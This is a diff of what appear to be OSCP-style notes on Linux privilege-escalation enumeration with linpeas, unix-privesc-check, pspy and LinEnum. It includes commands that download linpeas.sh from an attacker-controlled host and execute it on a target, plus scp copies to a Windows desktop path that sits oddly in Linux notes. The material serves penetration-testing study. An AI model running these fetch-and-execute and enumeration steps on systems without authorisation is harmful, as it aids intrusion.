@@ -1366,27 +1366,6 @@ Focus on
 - local services
 
 note: Automated tools are noisy. Do not blindly chase every warning. Prioritize findings that are writable, root-owned, or tied to privileged execution.
-#### unix-privesc-check
-
-Common usage:
-
-```bash
-unix-privesc-check standard  
-unix-privesc-check detailed
-```
-
-If copied to the target:
-
-```bash
-chmod +x unix-privesc-check  
-./unix-privesc-check standard > output.txt
-```
-
-**Notes**
-
-- `standard` is faster.
-- `detailed` is slower and may produce more false positives.
-- Review warnings manually before acting.
 
 #### linpeas
 
@@ -1403,32 +1382,62 @@ Serving HTTP on 0.0.0.0 port 80 http://0.0.0.0:80/...
 target
 ```bash
 wget http://kali_ip/linpeas.sh -O /tmp/linpeas.sh  
-chmod +x /tmp/linpeas.sh  
-/tmp/linpeas.sh
-
 # OR
-
 curl http://kali_ip/linpeas.sh -o /tmp/linpeas.sh  
+# OR
+scp linpeas.sh alice@ALICE_IP:C:\Users\alice\Desktop
+
 chmod +x /tmp/linpeas.sh  
 /tmp/linpeas.sh
 ```
 
+#### unix-privesc-check
 
-#### linenum
+Common usage:
 
 ```bash
-chmod +x LinEnum.sh  
-./LinEnum.sh
+unix-privesc-check standard  
+unix-privesc-check detailed
 ```
+
+If copied to the target:
+
+```bash
+cp /home/username/oscp/exploits/privesc/linux/unix-privesc-check . 
+scp unix-privesc-check alice@ALICE_IP:C:\Users\alice\Desktop
+
+chmod +x unix-privesc-check  
+./unix-privesc-check standard > output.txt
+```
+
+**Notes**
+
+- `standard` is faster.
+- `detailed` is slower and may produce more false positives.
+- Review warnings manually before acting.
+
 #### pspy
 
 Use `pspy` when you suspect root-run periodic jobs.
+[Github releases link](https://github.com/DominicBreuker/pspy/releases)
 
 ```bash
+cp /home/username/oscp/exploits/privesc/linux/pspy64 .
+
 chmod +x pspy64  
 ./pspy64
 ```
 
+#### linenum
+
+[Github link](https://github.com/rebootuser/LinEnum)
+
+```bash
+cp /home/username/oscp/exploits/privesc/linux/LinEnum.sh .
+
+chmod +x LinEnum.sh  
+./LinEnum.sh
+```
 
 Troubleshooting
 - Running LinPEAS first and ignoring manual enumeration.
